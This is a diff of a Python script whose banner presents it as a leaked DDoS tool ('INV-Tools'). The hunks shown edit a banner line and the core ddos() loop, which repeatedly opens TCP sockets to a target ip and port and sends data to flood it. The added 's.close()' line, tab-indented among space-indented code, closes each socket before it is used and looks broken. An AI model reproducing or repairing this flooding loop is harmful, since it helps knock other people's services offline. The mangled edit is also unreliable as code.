@@ -8788,7 +8788,7 @@ print("╚═══════════════════════�
 time.sleep(3)
 print("")
 print("╔══[INV-Tools]")
-print("║════  DDOS Owned By : Hann")
+print("║      DDOS Owned By : Hann")
 print("║      Creadit By    : iVannINV")
 print("║      Leaked By    : Hanggar")
 print("╚════>#TeamINV Admin : iVannINV")
@@ -8833,6 +8833,7 @@ def ddos():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	    s.close()
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 2)
             s.connect((ip,port))
             s.send(data)
